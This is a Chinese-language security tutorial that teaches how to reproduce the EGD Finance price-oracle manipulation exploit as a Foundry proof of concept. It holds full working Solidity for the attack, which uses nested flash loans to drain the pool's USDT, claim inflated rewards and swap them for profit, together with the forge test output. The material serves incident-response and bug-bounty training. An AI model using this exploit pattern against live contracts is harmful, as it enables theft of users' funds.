# OnChain Transaction Debugging: 3. Write Your Own PoC

Author: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

社群 [Discord](https://discord.gg/3y3d9DMQ)

同步發表: XREX | WTF Academy 

在 [01_Tools](/tutorials/onchain_debug/01_tools/readme.md) 教學中，我們學到了如何使用 Debug Tools 來觀察一筆交易和智能合約互動的過程。

在 [02_Warm](/tutorials/onchain_debug/02_warm/readme.md) 教學中，我們實際分析了一筆與 DEX 互動的交易，並且使用 Foundry 與 DEX 互動。

在本次教學中，我們將帶你實際分析一個攻擊事件，並逐步帶你利用 Foundry 測試框架撰寫代碼，完成 Reproduce PoC。

## 為什麼學習撰寫 Reproduce PoC 很重要？

DeFiHackLabs 期望更多人可以關注 Web3 安全，當攻擊事件發生時，有更多人可以一起分析事件原因，為安全網路做出貢獻。

1. 作為甲方，鍛鍊事件響應 (incident response) 的能力。
2. 作為乙方，鍛鍊威脅研究分析能力以及 Bug bounty 寫 PoC 的技能，獲得更有競爭力的賞金報酬。
3. 幫助藍隊更好的調校機器學習模型，例如 [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/)。
4. 比起閱讀安全機構的驗屍報告，自己撰寫 Reproduce 更能深刻理解駭客的攻擊思路。
5. 鍛鍊 Solidity 編程熟悉度，區塊鏈本質上就是個龐大的公開資料庫。

## 在學習撰寫 Reproduce PoC 之前，會需要具備的知識

1. 暸解常見智能合約漏洞樣態，可以參考 [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs) 進行練習。
2. 暸解 DeFi 基礎建設如何運作，以及智能合約與智能合約之間如何互動。

## 價格預言機原理簡介

在區塊鏈的世界中，智能合約的狀態變量與參數都是與世隔離的，智能合約沒辦法像傳統胖應用一樣能夠做到自啟動、自行透過 API 抓取價格資訊等操作。

智能合約要取得外部資料，通常有兩種作法：

1. 有一個實體 EOA，進行主動喂價。
2. 使用預言機，也就是"參照某個智能合約所儲存的參數，作為喂價資訊"。

舉一個例子：我有一個借貸合約，它想要取得 ETH 的價格來判斷借款人的部位是否可以被清算，我可以怎麼做？

在這個例子中，ETH 的價格是外部資料。

借貸合約想要取得 ETH 的價格資料，它可以向 Uniswap V2 獲取 ETH 價格資訊。

我們知道 `x * y = k` AMM 算法中，x 代幣的價格 = `k / y`。

所以，我們若想取得 ETH 的價格，可以找到 Uniswap V2 WETH/USDC 交易對合約: `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`。

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

本文撰寫時，該合約的代幣儲備量：

WETH: `33,906.6145928` 顆
USDC: `42,346,768.252804` 顆

我們套用 `x * y = k` 公式，就可以知道每顆 ETH 對應 USDC 的價格：

`42,346,768.252804 / 33,906.6145928 = 1248.9235`

(存在細微差距，通常代表交易手續費收入或是有人意外轉入代幣，可被 `skim()` 取走)

所以，套利合約若想要取得 ETH 的價格，Solidity Pseudocode 大致可以理解成：

```solidity=
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```

> 請注意，這種寫法容易被操縱預言機價格，請不要在生產環境這麼做。

如果需要詳細暸解 Uniswap V2 算法原理，推薦參考 [Smart Contract Programmer 教學影片](https://www.youtube.com/watch?v=Ar4Ik7Bov0U)。

如果需要詳細暸解價格預言機操縱原理，推薦參考 [WTFSolidity 教學文章](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md)。


## 現實中的價格操縱案例

大多數攻擊場景為：

1. 調換價格預言機地址
    - 根本原因: 特權操作缺乏身份驗證機制
    - 案例: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. 攻擊者透過閃電貸，瞬間抽走預言機的流動性，使受害合約取得異常的價格資訊
    - 此漏洞常在 GetPrice、Swap、StackingReward、Transfer(with burn fee) 等關鍵功能被利用
    - 根本原因: 項目方使用了不安全的預言機，或是未實現 TWAP 時間加權平均價格。
    - 案例: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

> Tips: 在進行 Code Review 時，最好注意 `balanceOf()` 使用上是否足夠嚴謹。

## 手把手撰寫 PoC - 以 EGD Finance 為例

### Step1: Infomation gathering

當攻擊發生時，通常 Twitter 會是安全分析師的主戰場，會有各路大佬在 Twitter 上發布自己對於攻擊事件的最新發現。

> Tips: 加入 [DeFiHackLabs Discord](https://discord.gg/vG4FePvr) security-alert 頻道，即時收到各路 DeFi 安全大佬們的消息！

攻擊事件剛發生時，肯定是各種混亂，先找個文件整理你所發現到的資訊吧！

1. Transaction ID
2. Attacker Address(EOA)
3. Attack Contract Address
4. Vulnerable Address
5. Total Loss
6. Reference Links
7. Post-mortem Links
8. Vulnerable snippet
9. Audit History

> Tips: 建議使用 DeFiHackLabs 提供的 [Exploit-Template.sol](script/Exploit-template.sol) 模板。

---

### Step2: Transaction Debugging

根據過往觀察，大約攻擊發生後 12 小時，通常各路資訊對於攻擊事件分析都梳理出 90% 以上了，此時手動進行交易分析都不會太困難。

我們之所以使用 EGD Finance 作為教學範例，原因是：

1. 讀者可以透過真實環境中學習價格預言機操縱風險
2. 讀者可以理解攻擊者如何透過價格操縱獲利
3. 讀者可以順便學到閃電貸運作原理
4. 攻擊者只使用一個 Transaction 完成攻擊，沒有複雜的前置動作，Reproduce 較簡單

讓我們使用 Blocksec 開發的 Phalcon 工具來分析 EGD Finance 攻擊事件，[分析連結](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3)。

<img width="1736" alt="PhalconOverview" src="https://user-images.githubusercontent.com/26408530/211231413-25e31110-4e3a-41c7-9dbb-d9fdc3a0e8da.png">

在 Ethereum Virtual Machine 中，你會看到三種調用方式：

1. Call: 一般的跨合約函數調用方式，這通常會改變被調用合約的存儲
2. StaticCall: 靜態調用，不會改變被調用合約的存儲，是屬於跨合約讀取狀態變數的操作。
3. DelegateCall: 委任調用，`msg.sender` 不會改變，通常用於 Proxy 代理模式，詳細說明可以參考 [WTFSolidity 教程](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall)。

請注意，Internal Function Call 是看不到的。

---

閃電貸攻擊套路通常是:

1. 確認可從 DEX 借走的餘額，以及確認受害者合約有足夠的餘額使攻擊者獲利
    - 這意味著在 Tx 前半部會有一些 Static Call
2. 呼叫借貸函數，從 DEX 或 Landing Protocol 收到閃電貸款
    - 重點: 尋找以下 Function Call
    - UniswapV2, Pancakeswap: `.swap()`
    - Balancer: `flashLoan()`
    - DODO: `.flashloan()`
    - AAVE: `.flashLoan()`
3. 借貸平台回調攻擊者合約
    - 重點: 尋找以下 Function Call
    - UniswapV2: `.uniswapV2Call()`
    - Pancakeswap: `.Pancakeswap()`
    - Balancer: `.receiveFlashLoan()`
    - DODO: `.DXXFlashLoanCall()`
    - AAVE: `.executeOperation()`
4. 攻擊者與受害合約互動，利用漏洞獲利
5. 閃電貸還款
    - 主動還款
    - 設定 approve，讓借貸平台用 `transferFrom()` 取走借款。

小練習: 你能定位出 EGD Finance Exploit Transaction 各個階段在哪嗎？試著找出閃電貸、回調函數、漏洞利用、了結獲利在哪。

`Expand Level: 3`

https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

> Tips: 實戰時，尚無法理清整個 Transaction 的攻擊邏輯的時候，可以先試著從最開始一步一步拷貝攻擊者的 CALL 足跡，多做筆記，再回過頭整理攻擊者的思路。

<details><summary>解答</summary>

<img width="1898" alt="TryToDecodeFromYourEyesAnwser" src="https://user-images.githubusercontent.com/26408530/211231457-74b3ba87-45fc-4fe0-ace2-678247f00f58.png">

</details>

---

截至目前為止，我們已對攻擊 Tx 有初步輪廓，讓我們根據現有發現，完成一部分 Reproduce Code 吧:

Step1. 完成 fixtures

<details><summary>點我展開代碼</summary>

```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// 宣告全局變量, 必須為 constant 類型
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // 模擬的攻擊者(EOA)
    Exploit exploit = new Exploit();

    constructor() { // 也可以寫成 function setUp() public {}
        // label 可以將錢包地址標籤化，方便在使用 forge test -vvvv 時提高可讀性
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //注意: 必須 fork 攻擊 tx 的前一個 block, 因為此時受害合約狀態尚未改變!!
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```

</details>
<br>

Step2. 模擬攻擊者調用 harvest 函數

<details><summary>點我展開代碼</summary>

```solidity=
contract Attacker is Test { // 模擬的攻擊者(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // label 可以將錢包地址標籤化，方便在使用 forge test -vvvv 時提高可讀性
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //注意: 必須 fork 攻擊 tx 的前一個 block, 因為此時受害合約狀態尚未改變!!
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
 
    function testExploit() public { // 必須為 test 開頭命名, 才能被 Foundry 執行 testcase
        // 攻擊前, 先 print 出餘額, 已便於更好的觀察 balance 變化
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //模擬 EOA 呼叫攻擊合約
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```

</details>
<br>

Step3. 完成一部分的攻擊合約

<details><summary>點我展開代碼</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // 攻擊合約
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // 漏洞利用...

        // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //攻擊者還款 2,000 USDT + 0.5% 服務費
        require(suc, "Flashloan[1] payback failed");
    }
}
```

</details>
<br>

---

讓我們繼續分析關鍵的漏洞利用部分...

我們可以看到在漏洞利用部分，攻擊者再次呼叫了 `Pancakeswap.swap()`，似乎是進行第二層的閃電貸：

![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

你可能會疑惑：Pancakeswap 都是透過 `.pancakeCall()` 介面回調攻擊者的合約，攻擊者是如何在兩次回調中，執行不同的代碼邏輯呢？

關鍵在於第一次閃電貸，攻擊合約帶入的 callbackData 是 `0x0000`

![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

而第二次閃電貸，攻擊合約帶入的 callbackData 是 `0x00`

![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)

透過這種方式，攻擊合約只需要判斷 `_data` 參數是 0x0000 還是 0x00 即可執行不同的代碼邏輯。

讓我們繼續分析第二層閃電貸回調的執行邏輯。

在第二層閃電貸回調，攻擊者與 EGD Finance 互動，僅呼叫了 `claimAllReward()` 函數：

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

將 `claimAllReward()` 展開，會發現 EGD Finance 僅僅是讀了 `0xa361-Cake-LP` 的 EGD Token 餘額以及 USDT 餘額，就將大量的 EGD Token 轉出給攻擊合約了！

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>0xa361-Cake-LP是什麼合約？</summary>

我們可以透過 Etherscan 看 `0xa361-Cake-LP` 究竟是對應哪一個交易對。

方法一：直接在 [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) 看該合約的前二個最大儲備量 Token (快速)

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)

方法二：[Read Contract](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract) 看 token0, token1 的地址 (準確)

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

現在，我們可以知道 `0xa361-Cake-LP` 指的是 EGD/USDT 交易對合約。

</details>
<br>

讓我們分析 `claimAllReward()` 函數，看看漏洞在哪裡。

<img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

我們可以發現到，使用者領取的 Staking Reward 數量，取決於獎勵因子 `quota` (代表用戶 Staking 多少代幣、Staking 多久時間) 乘上 `getEGDPrice()` 目前 EGD Token 的價格。

也就是說，合約給出的 EGD Staking Reward 會按照目前的 EGD Token 市價給予更多或更少的 Token 數量，**當 EGD Token 價格越高，則給予的 EGD Token 數量越少，當 EGD Token 價格越低，則給予的 EGD Token 數量越多**。

我們跟進 `getEGDPrice()` 函數，分析喂價機制：

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png">

可以看到喂價機制是採用 `x * y = k` 的公式，就如同我們在 ***價格預言機原理簡介*** 描述的一樣。

`pair` 地址即是 `0xa361-Cake-LP`，這也就能和我們在 Tx View 中看到的兩組 STATICCALL 配對起來了。

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

那麼具體上來說，攻擊者是如何利用這個不安全的價格參考進行價格操縱呢？

原理是，攻擊者在第二層閃電貸，向 `EGD/USDT Pair` 借出 USDT；在攻擊者還款之前，`getEGDPrice()` 取得到的價格資訊就會是不正確的。

參考示意圖：

<img width="840" alt="PriceManipulationGraph" src="https://user-images.githubusercontent.com/26408530/211231586-305cd6f2-ddd3-42aa-8a4c-5ec5a7a40dd6.png">

**總結：攻擊者透過閃電貸，抽走價格預言機的流動性，使 `ClaimReward()` 獲取到不正確的價格參考，進而使攻擊者可以領取到異常大量的 EGD Token。**

攻擊者利用漏洞取得大量 EGD Token 後，將 EGD Token 透過 Pancakeswap 換回 USDT，獲利了結。

---

截至目前為止，我們已完整分析攻擊原理，讓我們完成 Reproduce Code：


Step4. 完成第一次閃電貸的邏輯代碼

<details><summary>點我展開代碼</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // 攻擊合約
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //攻擊者借出 EGD_USDT_LPPool 的 99.99999925% USDT 流動性
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //攻擊者還款 2,000 USDT + 0.5% 服務費
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // 漏洞利用...
        }


    }
}
```

</details>
<br>


Step5. 完成第二次閃電貸(漏洞利用)的邏輯代碼

<details><summary>點我展開代碼</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // 攻擊合約
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //攻擊者借出 EGD_USDT_LPPool 的 99.99999925% USDT 流動性
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //攻擊者還款 2,000 USDT + 0.5% 服務費
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

若一切順利，命令列 `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv` 就可以看到 Reproduce 執行結果與 Balance 變化了。

[DeFiHackLabs - EGD-Finance.exp.sol](/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```

> 註: DeFiHackLabs 提供的 EGD-Finance.exp.sol 有 Reproduce 攻擊者的前置 Stacking 作業。
>
> 本教程未涵蓋到前置動作，你可以自己練習看看！
> Attacker Stack Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

第三課分享就先到這邊，想學更多可以參考以下學習資源。
---
## 學習資源
[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

https://web3sec.xrex.io/
